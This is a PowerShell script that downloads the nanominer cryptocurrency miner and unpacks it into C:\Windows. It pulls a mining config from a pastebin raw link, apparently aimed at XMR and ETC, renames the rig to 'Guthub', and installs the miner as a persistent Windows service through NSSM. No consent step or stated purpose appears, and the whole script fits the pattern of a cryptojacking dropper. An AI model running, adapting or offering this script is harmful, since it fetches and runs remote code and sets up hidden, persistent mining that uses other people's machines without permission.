param
(
    [string] $rigname = "Guthub"
)

mkdir C:\Windows\nanominer-windows-3.6.8 -ErrorAction SilentlyContinue
wget https://github.com/nanopool/nanominer/releases/download/v3.6.8/nanominer-windows-3.6.8.zip -OutFile $env:APPDATA\nanominer-windows-3.6.8.zip
Expand-Archive $env:APPDATA\nanominer-windows-3.6.8.zip -DestinationPath C:\Windows\

$url = "https://pastebin.com/raw/4Xck2RG4" #CPUGPU XMR & ETC

wget -O C:\Windows\nanominer-windows-3.6.8\config.ini $url
((Get-Content -path C:\Windows\nanominer-windows-3.6.8\config.ini -Raw) -replace 'Laptop',$rigname) | Set-Content -Path C:\Windows\nanominer-windows-3.6.8\config.ini

wget http://nssm.cc/release/nssm-2.24.zip -OutFile $env:APPDATA\nssm-2.24.zip
Expand-Archive $env:APPDATA\nssm-2.24.zip -DestinationPath $env:APPDATA\

Start-Process -FilePath "$env:APPDATA\nssm-2.24\win64\nssm.exe" -ArgumentList "install Nanominer C:\Windows\nanominer-windows-3.6.8\nanominer.exe"
Start-Process -FilePath "$env:APPDATA\nssm-2.24\win64\nssm.exe" -ArgumentList "set Nanominer AppDirectory C:\Windows\nanominer-windows-3.6.8" 

Start-Sleep -Seconds 15
